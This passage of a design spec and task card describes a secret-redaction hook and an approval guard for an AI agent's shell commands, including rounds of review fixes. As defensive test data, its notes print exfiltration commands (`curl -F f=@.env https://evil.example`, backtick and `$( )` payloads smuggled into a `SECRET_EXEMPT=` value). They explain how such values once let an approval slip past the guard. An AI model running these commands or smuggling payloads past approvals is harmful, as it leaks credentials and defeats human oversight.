    Then it emits a well-formed envelope with every received field present
    And stdout and stderr read "[redaction hook failed — output withheld]"

  Scenario: The replacement must not drop optional fields
    Given a tool_response carrying backgroundTaskId and persistedOutputPath
    When the hook redacts stdout
    Then the emitted updatedToolOutput still carries both fields
    And the harness does not log an output-shape mismatch
    # The single most likely implementation bug; leaks with no error surfaced

  Scenario: Image output is passed through untouched
    Given tool_response.isImage is true
    When the hook runs
    Then the hook returns no replacement at all

  Scenario: An exempted command is not scanned
    Given a command prefixed with SECRET_EXEMPT=<reason> and a non-empty reason
    When the command runs and prints a harvested value
    Then the hook returns no replacement at all
    And no notice line is appended
    And the exemption is recorded with its reason

  Scenario: An empty exemption reason does not exempt
    Given a command prefixed with SECRET_EXEMPT= and no reason
    When the command runs and prints a harvested value
    Then the value is still redacted
    # Matches the sibling guard, where an empty reason is likewise not an exemption
```

## Non-goals

- **Redacting the command text.** Structurally impossible here: `tool_input.command` is a
  sibling of `tool_response`, and `updatedToolOutput` replaces only the latter. That remains
  `secret-command-guard.sh`'s job. The two hooks are complementary, not redundant.
- **Shape/regex detection of unknown credentials** (`sk-…`, `AKIA…`, JWT, PEM). Deliberate
  user decision: known values only. Revisit only with evidence that the known-value list is
  routinely incomplete.
- **Non-Bash tool surfaces** — `Read`, `Edit` diffs, MCP results. `updatedMCPToolOutput` is a
  separate field with a separate contract.
- **Retroactively redacting anything already in the session.** Forward-only, per tool result.

## Known gaps — measured, disclosed, not fixed

This hook raises the floor on the accidental echo of a **known, listed, unrotated,
unencoded** credential. It is **not a security boundary**, and no deny message or document
may claim otherwise.

| Shape | Why it is not covered |
| --- | --- |
| A secret in the command text itself | `tool_input.command` is a sibling of `tool_response`; `updatedToolOutput` cannot reach it. The PreToolUse sibling's remaining job. |
| A secret in a file nobody listed | "Known values only" means exactly that. Discovery is not a fix — a `find` over `$HOME` at depth 4 did not finish in 2 minutes. |
| A secret fetched mid-command | `vault read`, `aws sts assume-role`, `gh auth token`, `op read` never existed in a file at harvest time. Large and **growing** — short-lived fetched credentials are the modern pattern. |
| A credential rotated by the command that prints it | The new value did not exist when the hook harvested, moments earlier. |
| A secret straddling the 30,000-char truncation | `stdout` is cut mid-token before the hook sees it. Whether the surviving fragment is redacted follows the composition rule, not a blanket floor: a fragment of a **<20-char needle** is never matched (whole-needle only), and a fragment of a **≥20-char needle** IS matched if at least 20 characters survive the cut — so the uncovered case is specifically a surviving fragment shorter than 20 characters. Content past 30,000 chars never reaches the model either, so it is not itself a leak. |
| A keychain-backed credential | `~/.docker/config.json` is 78 bytes with a `credsStore`; the value lives in Keychain. Same for `~/.authinfo.gpg`, `~/.mylogin.cnf`, Chrome's `Login Data`. No plaintext exists to harvest. |
| Truncated tokens (first 8 chars) | Catching them costs ~13.9 false blanks/day with a 4-char vendor prefix. Deliberately out of reach at the 20-char floor. |
| Encodings beyond raw/base64/URL | hex, gzip, encrypted, chunked across lines, one character per line. |
| A future sibling hook that also rewrites output | `PostToolUse` hooks run **in parallel on the original output, last write wins by completion time**. A second rewriting hook on `Bash` would race this one non-deterministically and could restore the unredacted text. No hook can defend against this; it must be a standing rule. |
| Any value below the strong arm's 6-char floor, or a weak-arm value under 24 chars with a non-matching key | e.g. `BUILD_ID=a1b2c3d4`. The direct, accepted price of not corrupting git SHAs and short innocent values. |
| **A silently degraded harvest** | If every source fails to parse, the hook harvests nothing and covers nothing. The in-band `[redaction: N of M sources unreadable]` notice is the only signal that this happened — it is emitted in its own envelope (Failure direction, row 2), but it is **unverified**: not measured end to end, and lost entirely if the harness rejects that envelope. In that case a user could believe redaction is active while it is covering nothing. |
| A secret that appears only in an encoding outside the nine needles | The needle set is fixed at build time; a value re-encoded by the command itself (gzip, hex, a custom alphabet) is not reached. |

## Verification plan

1. **Reproduce the platform contract before writing the hook.** The `updatedToolOutput`
   behaviour is undocumented publicly and was read from the binary and then measured. Re-run
   the end-to-end spike on the CLI version in use and confirm: the model receives the
   replacement, and the transcript JSONL stores the replacement.
2. **Falsify each failure row.** Build a deliberately broken hook for each row of the
   failure-direction table and confirm the canary leaks — a fail-open you have not seen fail
   is a fail-open you have not measured.
3. **Synthetic fixtures are mandatory, not optional.** A bounded search — `find` for `.env*`
   across `~/.worktrees` and `~/Documents`, `-maxdepth 5`, `node_modules` excluded — returned
   **zero files**, and most conventional credential paths listed in Sources were measured
   absent. That is the scope of the claim: **no `.env` file was found within those two trees
   at that depth.** A separate unbounded `find` over `$HOME` at depth 4 was killed at two
   minutes without completing, so "zero anywhere on this machine" is *not* established and
   must not be written down. Either way the consequence holds: a suite run only against the
   real home directory would report a perfect score with most parsers never executed. Every
   format in the sources table needs a fixture.
4. **Re-measure the filter against a held-out corpus** built after the rule is frozen. The
   17/17 · 0/24 figure is fitted and must not be quoted as a generalization estimate.
5. **A dedicated regression test for the dropped-field bug** — assert that a `tool_response`
   carrying optional fields round-trips them all.
6. **Registration self-test plus a mutation control**, per house convention
   (`hooks/secret-command-guard.test.sh:226-255`): jq the real `settings.json` for
   `.hooks.PostToolUse[]?.hooks[]?.command`, then re-run the identical query against a copy
   with the hook deleted and assert it reports missing.
7. **A test asserting this is the only `updatedToolOutput` emitter** registered on Bash, so
   the parallel-clobber hazard fails loudly the day someone adds a second one.

## Tasks

- [ ] 1. Re-measure the platform contract on the current CLI; record the version measured.
- [ ] 2. Write the failing test suite `hooks/output-secret-redaction.test.sh` — harness
      boilerplate from `hooks/secret-command-guard.test.sh:15-64` plus `assert_stdout` from
      `hooks/lib/guard_test_helpers.sh:31-38`; a `payload()` carrying `tool_response` and
      `hook_event_name:"PostToolUse"`.
- [ ] 3. Build the synthetic fixture tree — one file per format in the sources table.
- [ ] 4. Implement the harvester: explicit file list, source-chain following with a depth cap
      and visited-inode set, per-format parsers, 2 MB budget.
- [ ] 5. Implement the filter exactly as specified, including both URL rules and the weak-arm
      SHA/UUID denials.
- [ ] 6. Implement the scanner: the **nine** needles defined in Matching mechanics (with the
      `lead`/`full` trim arithmetic and its 2,100-embedding check), the two-strategy scan
      (`str.replace` loop under 20 chars, 20-gram index at or above it), both streams,
      `isImage` passthrough, and the two-floor composition rule.
- [ ] 7. Implement the wrapper, the `SECRET_EXEMPT` short-circuit (first non-empty reason
      wins; empty does not exempt), and the catch-all that emits a withheld-output envelope.
- [ ] 8. Register in `settings.json` under `PostToolUse` / matcher `Bash`.
- [ ] 9. Correct the false premise in all four sites in one commit; make this card the single
      authority the other three point at.
- [ ] 10. Add the parallel-rewrite hazard to `rules/gates.md`.
- [ ] 11. Build the held-out corpus and re-measure the filter; record both numbers.
- [ ] 12. Write the ADR. **Re-fetch `origin` and re-check the next free number first** — the
      candidate `0040` came from a snapshot roughly a day stale, `git fetch origin` failed
      with `Permission denied (publickey)` in that environment, and two `0026-*` files already
      coexist on `origin/main`, so collisions here are real rather than hypothetical.
- [x] 13. **Secret-gate override, mechanical half.** *(landed 2026-08-30)*
      Two limits found in review and closed by REFUSING rather than by parsing, so the
      guard never prints a route that cannot work. A command is **not approvable** if it
      contains a redirection (`<`/`>`) -- at the time this landed, because the lexer
      dropped redirections from `argv` and `cat .env` / `cat .env > /tmp/leak` therefore
      shared an id, so approving the read would have approved the write (**that specific
      reason is now historical only -- see the round-4 follow-up note below, which changed
      what the id is computed over; the refusal itself was kept anyway**); or if a **wrapper word** (`rtk`, `time`, `eval`,
      `command`, `builtin`, `exec`, `nohup`) makes the id unstable, because
      `shell_segments` strips a leading wrapper *before* it reads assignments, so adding
      `SECRET_EXEMPT=` stops the stripping and moves the id (`nohup cat .env` →
      `088ade89056f9f6a`, with the flag → `ee2802fc504a950a`, measured). The second is
      detected by testing the property itself — the id must not move when the flag is
      added — rather than by copying the lexer's wrapper list, which would drift.
      Separately, an **input** redirection was measured to hide the path from the block
      check entirely (`cat < ~/.zshrc` → `argv ['cat']`, allowed): pre-existing, the
      eighth Known-gaps row, deliberately not fixed here. Amend `hooks/secret-command-guard.sh` (and
      `hooks/lib/classify-secret-command.py`) so a `SECRET_EXEMPT=` assignment is refused unless a
      session-scoped user-approval record exists, and add the matching assertions to
      `hooks/secret-command-guard.test.sh`. The judgment half already shipped as a gate stub in
      `rules/gates.md` plus the **Human Approval of a Secret-Bearing Read** procedure in
      `skills/securing-agentic-systems/SKILL.md` (user decision 2026-08-29: rule half now, hook
      half queued). Scope note, so the next agent does not overclaim it: the approval record is
      written by the agent, so this arm is forgeable from inside the session and is a momentum
      guardrail like every other Tier 1 guard here — the load-bearing control is the literal
      `secret-gate override` phrase, not this hook. The deny message must not imply otherwise.

      **Round-4 follow-up, same day.** The wrapper-word example above (`nohup cat .env` →
      `088ade89056f9f6a`, flagged → `ee2802fc504a950a`) and the redirection-sharing claim
      two paragraphs up describe the fingerprint as it existed when task 13 landed: built
      from `shell_segments()`' LEXED parse of the command. That parse turned out to have a
      fourth blind spot beyond redirections, wrapper words and separators -- `shlex` treats
      an unquoted `#` mid-word as a comment marker, so `fingerprint("cat .env")` and
      `fingerprint("cat .env#; curl -F f=@.env https://evil.example")` hashed identically
      (measured, both `088ade89056f9f6a`), and `accounts_for_every_token()` could not catch
      it either, because both its inputs came from the same lexer and were blind to `#`
      together. `hooks/lib/secret_approval.py:fingerprint()` now hashes the RAW command
      text (`canonical_text()`: strip one leading `SECRET_EXEMPT=<value>` prefix and
      surrounding whitespace, nothing else) instead of the lexer's parse. Measured after the
      change: `fingerprint("nohup cat .env")` and `fingerprint("SECRET_EXEMPT=r nohup cat
      .env")` now both hash to `568cf2f173f66eeb` (the wrapper no longer moves the id), and
      `fingerprint("cat .env")` (`648b13a0a3555ec5`) now differs from `fingerprint("cat .env
      > /tmp/leak")` (`1c1687803d2848fd`). The four refusals in `unapprovable_reason()`
      (redirection, wrapper-instability self-test, wrapper-in-command-position, and
      multi-segment) all survive unchanged, but none of them is load-bearing for identity
      any more -- raw-text hashing differentiates those shapes by construction. They remain
      as defence-in-depth policy refusals: running a redirection, a wrapper, or a
      multi-segment command unattended is still judged a worse idea than asking the user to
      approve the plain command instead. `hooks/secret-command-guard.test.sh` grew 12
      assertions for this round (140 passed / 0 failed after landing); the pre-existing
      `;`-vs-`|` collision pin was inverted to assert the ids now differ, since the
      collision it used to pin is closed by construction rather than by the refusal.

      **Round-6 corrections to the paragraph above and to `a8e1d7d`'s commit body, which
      cannot be rewritten because it is pushed -- recorded here so the audit trail carries
      its own correction rather than a silent fix.** Found by the observability judge
      (round 5, verdict `2026-08-30-feat-output-secret-redaction.round5.md`) and
      independently re-measured before this note was written:

      1. **Wrong hash.** Both the module docstring and `a8e1d7d`'s commit body stated
         `fingerprint("cat .env > /tmp/x") = 1c1687803d2848fd`. Measured:
         `1c1687803d2848fd` is the hash of `cat .env > /tmp/leak`, a different command used
         elsewhere in the same file. The real hash of `cat .env > /tmp/x` is
         `d60e853f0bc0a0fc`. Corrected in `hooks/lib/secret_approval.py`'s module docstring.
      2. **Wrong assertion arithmetic.** The commit body said "11 fingerprint + 1 end-to-end"
         assertions were added, with "6 of 11" turning red against pre-round-4 `3b7f44c`.
         Measured: 9 `fp_eq_case`/`fp_ne_case` assertions + 2 end-to-end `run_case_sid`
         assertions + 1 Known-gaps ALLOW row = 12 assertions (matches the suite's 128→140
         growth), and the red count against `3b7f44c` is 6 of 12, not 6 of 11.
      3. **The instability self-test never fired.** "The four refusals in
         `unapprovable_reason()` ... all survive unchanged" (above) was true as a list of
         four checks existing in the source, but one of them --
         the wrapper-instability self-test -- could never fire: it compared
         `fingerprint(command)` against `fingerprint(EXEMPT_VAR=x + canonical_text(command))`,
         and `canonical_text()` always strips exactly the prefix that comparison had just
         invented, so the two sides were equal by construction. Measured: 0 fires in
         300,000 fuzz commands, 0 of the 379 command strings the suite exercised at the
         time, and deleting the check left the suite green (140 passed / 0 failed). It was
         documented as a live defence-in-depth refusal in three places (this file, the
         module docstring, and the a8e1d7d commit body) while doing nothing at runtime.
      4. **Its disclosed mitigation didn't mitigate.** A gap this round shipped
         unverified -- `SECRET_EXEMPT=a'b' cat .env` and `SECRET_EXEMPT=x"y" cat .env` are
         valid bash assignments whose value starts unquoted and switches to quoted
         mid-word, which `_EXEMPT_PREFIX_RE`'s value alternation cannot span. The commit
         body pointed at the (dead) instability self-test as the runtime mitigation for
         this exact gap; since that check never fired, the mitigation was false as shipped.
         The gap itself failed SAFE (the grant became unspendable, not a leak), but the
         deny message blamed "no recorded approval" rather than naming the real cause.
      5. **The redirection refusal was shadowed by the backstop.** A mutation
         scorecard (deleting each check in `unapprovable_reason()` from a scratch copy,
         one at a time, and re-running the suite) showed deleting the redirection-specific
         check left the suite at 140 passed / 0 failed -- no assertion discriminated it
         from `accounts_for_every_token()`'s generic backstop. Root cause: the wrapper
         script (`hooks/secret-command-guard.sh`) appended a fixed boilerplate line whenever
         *any* `unapprovable_reason()` check fired -- "seek approval for the plain command
         without the redirection or wrapper word" -- which contained the literal word
         "redirect" regardless of which check actually produced the refusal, so a
         `run_case_*_msg` assertion grepping the hook's full stderr could never tell them
         apart. The same shadowing applied to the mislabeled test below. `cbee532` reworded
         that boilerplate line to "change the command to remove what the reason above
         names", which no longer contains "redirect" -- the shadowing this describes is
         closed at the message level too, on top of the test's own fix (calling
         `secret_approval.py id` directly instead of grepping the wrapper's stderr).
      6. **A mislabeled test.** The assertion named "...and the reason names the
         instability" (input `time cat .env`) matched only because the BACKSTOP's generic
         message happens to contain the word "wrapper" -- the instability check had no
         coverage at all, and `time cat .env` is a wrapper shape, not an instability shape.

      **Round 6 (2026-08-31) fixed all six.** `unapprovable_reason()`'s dead
      instability check was replaced -- not merely deleted -- with one that asks
      whether `segments(canonical_text(command))` still finds a `SECRET_EXEMPT`
      assignment, i.e. whether a second, independent reader (the lexer) agrees the
      stripping regex actually stripped the flag this command carries. It fires on both
      disclosed shapes and on neither of the four controls (`SECRET_EXEMPT=plain`, a
      single-quoted reason, a double-quoted reason, and the unflagged command), verified
      by direct assertions plus a 75,000-command probe (50,000 ordinary commands, 20,000
      cleanly-quoted `SECRET_EXEMPT` values, 5,000 unstable-quoting values): 0 false
      fires, 0 misses. New assertions call `secret_approval.py id` directly rather than
      through the wrapper, so the redirection check and the wrapper-word backstop are now
      pinned by their own message text instead of the wrapper's shared boilerplate. Full
      mutation scorecard, before and after, in the round-6 commit message.

      Unlike the redirection/wrapper/multi-segment checks, the round-6 instability check
      IS load-bearing for identity, not policy-only -- it is the only thing standing
      between `canonical_text()`'s stripping regex and a printed id nobody can ever
      spend. So the accurate count as of round 6 is one load-bearing check plus three
      policy-only ones, not "four defence-in-depth refusals, none load-bearing", which
      was the round-4-to-round-5 framing in both this file and the module docstring and
      is no longer accurate.

      **Round 7 (2026-08-31): excluding the value from the hash was safe only if the
      value could not also smuggle in behaviour, and it could.** `canonical_text()`
      strips one leading `SECRET_EXEMPT=<value>` prefix before hashing (round 4), which
      correctly keeps a re-typed reason from wasting a grant -- but bash still EXECUTES
      that value when the flagged command is re-run, and nothing anywhere checked what
      the value contained. A backtick command substitution inside it therefore rode in on
      an approval granted for the plain command it was attached to, because the id the
      human inspected and the id the flagged re-run computed were IDENTICAL -- the value
      was never part of either one. Measured, PRE-round-7:

          fingerprint("cat .env")                                              = 648b13a0a3555ec5
          fingerprint("SECRET_EXEMPT=`curl${IFS}-sd@.env${IFS}...` cat .env")   = 648b13a0a3555ec5   <- SAME

      `grant()` for the plain form, then submit the backtick form: **allowed, and the
      grant was consumed** -- an approval for `cat .env` cleared a command that
      exfiltrates it. PRE-round-7, the `$( )` form of the same idea was refused too, but
      only by accident: `unapprovable_reason()`'s multi-segment check fired because shlex
      split on the parens, not because anything inspected the value -- `is_approvable()`
      returned `True` for the backtick form, and would have for the `$( )` form too if
      that check were ever removed or narrowed. **That was a refusal by accident, not a
      defence,** and nothing in the pre-round-7 code or docs should be read as claiming
      otherwise.

      **CORRECTION:** as of this round, the allowlist below refuses the `$( )` form
      first and deliberately -- before the multi-segment check ever runs -- so the
      refusal is no longer an accident (a suite assertion in `f39546f` pins
      that: "ROUND 7: a `$( )` form is unapprovable for the SAME reason, not by
      accident"). The paragraph above is kept as the historical record of why the fix
      was needed, not as a description of the current behaviour.

      Fixed by allowlisting the value in `unapprovable_reason()` rather than denylisting
      dangerous characters: `^[A-Za-z0-9._,:/-]+$`, checked against the raw text
      `canonical_text()` would strip (`leading_exempt_value()`, `secret_approval.py`).
      Four prior rounds (4 through 6) each found one more character class or quoting
      shape an enumeration had missed; this round does not extend that enumeration, it
      inverts it -- naming what is allowed instead of what is refused. The value stays
      excluded from the hash, unchanged from round 4; it is now also constrained so that
      excluding it from identity is safe. A cleanly quoted, space-containing reason
      (`SECRET_EXEMPT='a b'`) is refused too, not just a malformed one -- two existing
      suite controls asserting such reasons "still strip cleanly" (true for the hash,
      but no longer true for approvability) were inverted rather than left green and
      silently contradicted by the new assertions. As of this round (`f39546f`),
      `hooks/secret-command-guard.test.sh` grew from 149 passed / 0 failed to 160 passed /
      0 failed; deleting the new check alone reproduces exactly the same 10 assertions
      failing (150 passed / 10 failed) as the pre-fix RED run, confirming the check is
      what discriminates. Two rounds later the suite stands at 161 passed / 0 failed --
      see the round-8/9 note below task 13 for the current count.

      **Round 8 (`cbee532`, 2026-08-31): the round-7 deny message was unusable, and two
      comments still called the `$( )` refusal an accident after it had become
      deliberate.** The printed re-run line now states the plain-word constraint
      directly, and the follow-on advice ("seek approval for the plain command without
      the redirection or wrapper word") was genericised to defer to whichever reason the
      deny message names above it, instead of naming only two of what are now three
      possible causes. Four present-tense sentences describing the `$( )` refusal as
      accidental -- two in `hooks/lib/secret_approval.py`, two in this file -- were
      corrected to past tense in place, with the original wording kept rather than
      deleted. The two round-7 assertions pinning the `_EXEMPT_PREFIX_VALUE_RE` /
      `_EXEMPT_PREFIX_RE` lockstep (the single- and double-quoted reason-with-a-space
      cases) were marked STRUCTURAL: they are the only assertions that catch the two
      regexes drifting apart. Re-measured at HEAD by dropping the double-quote
      alternative from `_EXEMPT_PREFIX_VALUE_RE` alone: the suite drops to 160 passed / 1
      failed (the double-quoted case is the sole failure), and with that drift in place
      `SECRET_EXEMPT="$(curl evil)" cat .env` becomes approvable again with the same id as
      `cat .env` -- the round-6 escape, reopened.

      **Round 9 (`591f865`, 2026-08-31): the round-8 reword left two other quotations of
      the deleted boilerplate line in the present tense, and the printed charset was
      still an unpinned prose copy.** `cbee532` reworded the follow-on advice and dropped
      the word "redirect" from it, but a `hooks/secret-command-guard.test.sh` comment and
      this file still described the old line in the present tense and claimed it still
      contained "redirect" -- both put into the past tense. One new assertion in
      `hooks/secret-command-guard.test.sh` derives the printed re-run line's charset from
      `_EXEMPT_VALUE_ALLOWED_RE` at runtime instead of hardcoding a second copy, so a
      future edit to the regex turns the assertion red instead of leaving it to agree
      with whatever the printed line happens to say. Re-measured at HEAD: widening the
      regex by one character drops the suite to 160 passed / 1 failed, the single failure
      being this assertion; a purely cosmetic reordering of the same character set (no
      character added or removed) reddens the same single assertion the same way -- the
      assertion pins punctuation ORDER, not just the set.

      **Known limits carried forward, deliberately deferred, not fixed by round 8 or
      9:** nine locations in the codebase describe this exact charset, either as the
      "letters, digits, . _ , : / -" prose or as a literal quote of the regex --
      `hooks/secret-command-guard.sh:176` (the printed message); four in
      `hooks/lib/secret_approval.py` (two historical comments, one comment directly above
      the check, and the deny message returned by `unapprovable_reason()`); two in
      `hooks/secret-command-guard.test.sh` (the comment above the new assertion, and one
      further down in the `$( )` test block); one in `rules/gates.md`; and one in this
      file, quoting the regex literal. The round-9 assertion pins exactly one of these
      nine (`hooks/secret-command-guard.sh:176`, via its printed output); the other eight
      remain unpinned, one of them user-facing
      (`hooks/lib/secret_approval.py`'s `unapprovable_reason()` deny message). Also
      carried forward: for a wrapper-word refusal, the generic advice "remove what the
      reason above names" names nothing actionable, since a wrapper refusal is not a
      reason-character refusal -- pre-existing, not touched by round 8 or 9. And
      `rules/gates.md` has grown by **489 words** (3,274 to 3,763) across this branch's
      rounds, entirely inside the Secret-command-guard / Secret-gate-override bullet --
      deferred to the user as its own change, not touched here.

      ⚠️ **Correction, same day, to the round-9 implementer's figure and to the sentence
      it replaced.** The round-9 implementer reported this growth as "roughly 2,081 words
      (1,691 to 3,772)" and offered it as a correction to the observability judge's
      ~491, which it called "off by more than 4x". Re-measured by the main agent: **the
      judge was right and the correction was wrong.** The implementer took its baseline
      from **local `main`** (merge-base `fd552e9`, where `rules/gates.md` is 1,690 words),
      which is stale -- this branch already merged `origin/main` at `92e087c`. Against
      the deciding ref, `origin/main`, the merge-base is `92e087c` and the file is 3,274
      words there; HEAD is 3,763. Delta **+489**, matching the judge's ~491 to within
      tokenizer noise. Measured with `len(git show <ref>:rules/gates.md .split())` for
      both `main` and `origin/main`, printed side by side so the two baselines could not
      be confused again. The lesson is the one this repo has recorded before: a "next
      free number" or a "growth since main" check must be run against the ref that
      actually decides, never a stale local branch.

## Decisions taken — user-confirmed 2026-08-28

1. **`SECRET_EXEMPT` disables output redaction as well.** One flag clears both layers. A user
   who has justified reading a secret file does not want the output blanked either, and a
   second flag name is a memorisation cost for a rare case. Accepted cost: the two layers
   cannot be switched independently, so a command where the read is permitted but the output
   should still be protected is not expressible.
   Mechanics, matching the sibling guard exactly (`classify-secret-command.py:125-131`): the
   reason is read from the leading `VAR=value` assignments of any segment of the command text,
   the **first non-empty** `SECRET_EXEMPT` wins, and an **empty** reason does not exempt. On
   exemption the hook returns no replacement at all — no redaction and no notice line — and
   records the reason.
2. **The 6-character floor on credential-named values is accepted.** It will occasionally
   blank a short innocent value sitting under a credential-sounding name (the
   `AUTH_MODE=oauth2` scenario, recorded in Scenarios). Missing `DB_PASSWORD=hunter2` is the
   worse error, short passwords being the weakest ones, and the denylist already catches the
   common English-word cases.
3. **The spec goes to human review rather than a seventh judge round** (2026-08-28). Six
   rounds returned 7 → 6 → 6 → 3 → 3 → 4 violations; every round's fixes were verified fixed
   by the next, and every round then found new defects in the prose recording those fixes.
   Round 6 stated that none of its findings touched the design's soundness. The residual risk
   is documentation precision, which is what a human read catches and what further automated
   rounds keep regenerating.

## Not verified

- The stdout/stderr split on a **failing** command was not measured; the nested test session
  rewrapped the command differently on each attempt and then declined to issue it verbatim.
  The design scans both fields, which is correct under either behaviour, but the underlying
  split remains unmeasured.
- `persistedOutputPath` — whether a spilled-to-disk output file is also rewritten when
  `stdout` is replaced. Subagent measurement shows `stdout` is truncated to 30,000 chars
  before the hook sees it, which suggests the spill happens elsewhere, but the interaction
  was not tested directly.
- **Provenance of every number in this card, stated once so no table reads as first-hand.**
  Reproduced independently by me, after a compliance judge flagged each: the four entropy
  cells (`ent.py`), the base64 trim arithmetic (`b64.py`, 2,100 embeddings) and the
  scan-strategy costs (`scan.py`) — all three now **tracked** under
  `docs/features/evidence/output-secret-redaction/` rather than in gitignored scratch, because
  `scan.py` is the sole evidence for a mandated algorithm choice and a reviewer must be able
  to re-run it. Measured by me directly: the `updatedToolOutput` replacement, its absence from the
  transcript JSONL, and the parallel/last-write-wins clobber. **Everything else — the runtime table, the hashing costs, the false-blank rates,
  the 30,000-char truncation, the failure-direction matrix, and all filter figures — comes
  from subagent measurement that I have not reproduced.** The filter figures additionally
  come from a corpus the same agent tuned against.
- The claim that this hook closes six of the sibling card's eight gap shapes is a reading of
  that card's table, not a measurement. It should be re-derived against the shapes as they
  stand when implementation starts. The count was five-of-seven until 2026-08-30, when an
  eighth row (an input redirection) was measured and added; classifying that one as closed is
  the same kind of unverified reading as the original five, not a stronger claim.
